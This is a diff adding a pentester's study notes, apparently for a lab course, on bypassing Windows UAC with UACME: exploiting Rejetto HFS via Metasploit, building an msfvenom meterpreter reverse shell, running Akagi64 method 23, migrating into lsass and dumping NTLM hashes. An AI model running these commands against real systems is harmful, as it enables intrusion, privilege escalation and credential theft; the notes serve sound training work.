@@ -135,3 +135,46 @@ _meterpreter_
 
 - user mode, limited access
 - kernel mode, highest level of access
+
+**Bypassong UAC with UACME**
+
+- User Account Control
+- Windows security feature
+- can be bypassed
+
+Pre-requisites to bypass UAC:
+
+1. access to user Account
+   that is part og the local administrators group on the windows target system
+2. if UAC protection level is set below high, windows programs can be executed with elevated privileges without the user for confirmation
+3. tools will vary by windows version
+
+**Exploit UAC**
+STEP 1: Getting user account
+
+1.  nmap scan, identify
+2.  (this is for rejetto file server 2.3)
+3.  open msfconsole: `service postgresql start && msfconsole`
+4.  search rejetto vuln: `serach rejetto`
+5.  configure options then run
+6.  som commands and actions: 1.`sysinfo`, 2.`pgrep explorer`, 3.`migrate <number you got from prev command>`,
+
+**Privelege escalation:**
+github repository for exploiting:https://github.com/hfiref0x/UACME
+STEP 2: Privelege escalation
+
+7. create a reaverseshell: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your IP> LPORT=1234 -f exe > shell.exe`
+8. set up listener, new msfconsole session: `msfconsole`
+9. in msfvenom `use multi/handler`
+10. payload: `set payload windows/meterpreter/reverse_tcp`
+11. `set LHOST` , `set LPORT` <-- to port created in shell.exe, then hit `run`
+12. IN THE WINDOWS ACCOUNT METERPRETER SESSION: navigate to C: `cd C:\\`
+13. create Temp dir: `mkdir Temp` then `cd Temp`
+14. Upload shell `upload shell.exe`
+15. upload Akagai64(UAC Exploit): `upload /root/Desktop/tools/UACME/Akagi64.exe`
+16. open shell session: `shell`
+17. exploit method 23, should bet elevated privs: `.\Akagi64.exe 23 C:\Temp\shell.exe`
+18. migrate to lsass.exe(for NT AUTHORITY\SYSTEM): list processes:`ps`, `migrate 688` <--PID number , when in folder(INFO):`C:\Windows\system32`
+19. get hashdump NTLM hashdump: `hashdump`
+
+**Privelege Escalation: Access Token Impersonation**
